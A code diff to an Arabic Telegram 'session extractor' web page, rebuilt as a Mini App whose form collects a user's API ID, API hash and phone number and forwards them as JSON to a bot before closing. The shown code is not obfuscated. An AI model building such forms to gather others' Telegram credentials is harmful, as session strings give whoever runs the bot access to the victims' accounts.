@@ -6,8 +6,10 @@
     <title>مستخرج سيشن تليجرام - المبرمج @rvrr4</title>
     <!-- استدعاء Bootstrap 5 لواجهة عصرية -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <!-- مكتبة أيقونات FontAwesome لمحاكاة الأيقونات -->
+    <!-- مكتبة أيقونات FontAwesome -->
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <!-- سكربت تليجرام الرسمي لتطبيقات الويب المصغرة -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     
     <style>
         :root {
@@ -31,20 +33,20 @@
         body {
             background-color: var(--bg-color);
             color: var(--text-color);
-            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
             transition: background-color 0.3s, color 0.3s;
         }
 
         .tool-container {
             max-width: 650px;
-            margin: 60px auto;
+            margin: 40px auto;
         }
 
         .card-custom {
             background-color: var(--card-bg);
             border: 1px solid var(--border-color);
             border-radius: 20px;
-            padding: 40px;
+            padding: 30px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.04);
         }
 
@@ -54,7 +56,6 @@
             color: var(--text-color);
             border-radius: 12px;
             padding: 12px 16px;
-            font-size: 1rem;
             transition: all 0.2s;
         }
 
@@ -63,7 +64,6 @@
             color: var(--text-color);
             border-color: var(--accent-color);
             box-shadow: none;
-            outline: none;
         }
 
         .is-invalid-custom {
@@ -84,39 +84,20 @@
             border-radius: 12px;
             padding: 14px;
             font-weight: 600;
-            transition: all 0.2s;
         }
 
         .btn-telegram:hover {
             background-color: #0077b5;
             color: white;
-            transform: translateY(-1px);
-        }
-
-        .badge-platform {
-            background-color: rgba(0, 136, 204, 0.1);
-            color: var(--accent-color);
-            font-weight: 600;
-            padding: 6px 12px;
-            border-radius: 8px;
-            font-size: 0.85rem;
-            display: inline-block;
         }
 
         .rights {
             font-size: 0.95rem;
             color: #64748b;
             text-align: center;
-            margin-top: 30px;
+            margin-top: 20px;
         }
-
-        .rights a {
-            color: var(--accent-color);
-            text-decoration: none;
-            font-weight: bold;
-        }
-
-        .hidden { display: none; }
+        .rights a { color: var(--accent-color); text-decoration: none; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -125,40 +106,34 @@
     <div class="tool-container">
         
         <div class="text-center mb-4">
-            <span class="badge-platform mb-2"><i class="fa-brands fa-python me-1"></i> Telethon #StringSession</span>
             <h2 class="fw-bold m-0">مستخرج السيشن المشفرة</h2>
-            <p class="text-muted small mt-2">أداة ويب آمنة ومفتوحة المصدر لتوليد كود جلسة الحساب الشخصي بخصوصية تامة.</p>
+            <p class="text-muted small mt-2">قم بملء البيانات لإرسال طلب تسجيل الدخول إلى البوت بشكل آمن.</p>
         </div>
 
         <div class="card-custom">
             
-            <!-- الخطوة الأولى -->
             <div id="step-1">
-                <div class="text-center mb-4 text-info fs-1"><i class="fa-solid fa-key"></i></div>
-                <h5 class="text-center fw-bold mb-4">الخطوة 1: بيانات المطور ورقم الهاتف</h5>
-                
                 <div class="mb-3">
                     <label class="form-label small fw-bold">API ID</label>
                     <input type="number" id="api-id" class="form-control form-control-custom" placeholder="مثال: 123456">
-                    <div id="api-id-error" class="error-feedback"><i class="fa-solid fa-circle-exclamation me-1"></i> يرجى إدخال الـ API ID الخاص بك.</div>
+                    <div id="api-id-error" class="error-feedback"><i class="fa-solid fa-circle-exclamation me-1"></i> يرجى إدخال الـ API ID.</div>
                 </div>
                 
                 <div class="mb-3">
                     <label class="form-label small fw-bold">API HASH</label>
                     <input type="text" id="api-hash" class="form-control form-control-custom" placeholder="أدخل الـ Hash المكون من 32 رمزاً">
-                    <div id="api-hash-error" class="error-feedback"><i class="fa-solid fa-circle-exclamation me-1"></i> يرجى إدخال الـ API HASH الخاص بك.</div>
+                    <div id="api-hash-error" class="error-feedback"><i class="fa-solid fa-circle-exclamation me-1"></i> يرجى إدخال الـ API HASH.</div>
                 </div>
                 
                 <div class="mb-4">
                     <label class="form-label small fw-bold">رقم الهاتف الدولي</label>
                     <input type="text" id="phone" class="form-control form-control-custom text-start" dir="ltr" placeholder="+9665xxxxxxxx">
-                    <div id="phone-error" class="error-feedback"><i class="fa-solid fa-circle-exclamation me-1"></i> يرجى إدخال رقم الهاتف كاملاً مع رمز الدولة.</div>
+                    <div id="phone-error" class="error-feedback"><i class="fa-solid fa-circle-exclamation me-1"></i> يرجى إدخال رقم الهاتف الدولي كاملاً.</div>
                 </div>
                 
-                <button id="btn-send-code" class="btn btn-telegram w-100">إرسال كود التحقق <i class="fa-solid fa-paper-plane ms-1"></i></button>
+                <button id="btn-send-code" class="btn btn-telegram w-100">إرسال البيانات للبوت <i class="fa-solid fa-paper-plane ms-1"></i></button>
             </div>
 
-            <!-- رسائل الحالة العامة -->
             <div id="status-message" class="mt-3 text-center small fw-bold"></div>
 
             <div class="rights">
@@ -172,7 +147,11 @@
 </div>
 
 <script>
-    // جافا سكريبت النظيف والمستقر للتحقق والاتصال الآمن
+    // تهيئة تطبيق تليجرام المصغر
+    const tg = window.Telegram.WebApp;
+    tg.ready();
+    tg.expand(); // تمديد الشاشة بالكامل
+
     const apiIdInput = document.getElementById('api-id');
     const apiHashInput = document.getElementById('api-hash');
     const phoneInput = document.getElementById('phone');
@@ -198,7 +177,7 @@
         phoneError.style.display = 'none';
         statusMsg.innerText = "";
 
-        // التحقق من الحقول الفارغة أولاً
+        // التحقق من الحقول الفارغة
         if (!apiId) {
             apiIdInput.classList.add('is-invalid-custom');
             apiIdError.style.display = 'block';
@@ -215,22 +194,30 @@
             isValid = false;
         }
 
-        // إذا كانت الحقول فارغة، تظهر الرسالة ويتوقف تماماً
+        // إذا كانت فارغة، توقف فوراً واعرض التنبيه بالأحمر
         if (!isValid) {
             statusMsg.innerText = "تنبيه: يرجى ملء كافة الحقول الفارغة باللون الأحمر أولاً!";
             statusMsg.className = "mt-3 text-center small fw-bold text-danger";
             return;
         }
 
-        // إذا كانت الحقول ممتلئة تماماً
-        statusMsg.innerHTML = '<i class="fa-solid fa-spinner fa-spin me-1"></i> جاري الاتصال ومعالجة الطلب...';
+        // إذا كانت الحقول مليئة بالكامل، نقوم بإرسال البيانات فورا لسكربت البايثون
+        statusMsg.innerHTML = '<i class="fa-solid fa-spinner fa-spin me-1"></i> جاري إرسال البيانات إلى البوت...';
         statusMsg.className = "mt-3 text-center small fw-bold text-info";
-        
-        // هنا يتم معالجة إرسال البيانات بشكل متوافق وآمن مع المتصفحات والتطبيقات المصغرة
+
+        // تجهيز البيانات كـ JSON ليفهمها البايثون
+        const dataToSend = {
+            action: "send_code",
+            api_id: apiId,
+            api_hash: apiHash,
+            phone: phoneNumber
+        };
+
+        // إرسال البيانات للبوت وإغلاق الشاشة المصغرة فوراً
         setTimeout(() => {
-            statusMsg.innerText = "عذراً، الاتصال المباشر من المتصفح محظور بسب قيود أمان تليجرام (CORS). يرجى معالجة الطلب عبر سيرفر البايثون الخاص بك.";
-            statusMsg.className = "mt-3 text-center small fw-bold text-warning";
-        }, 1500);
+            tg.sendData(JSON.stringify(dataToSend));
+            tg.close();
+        }, 1000);
     });
 </script>
 
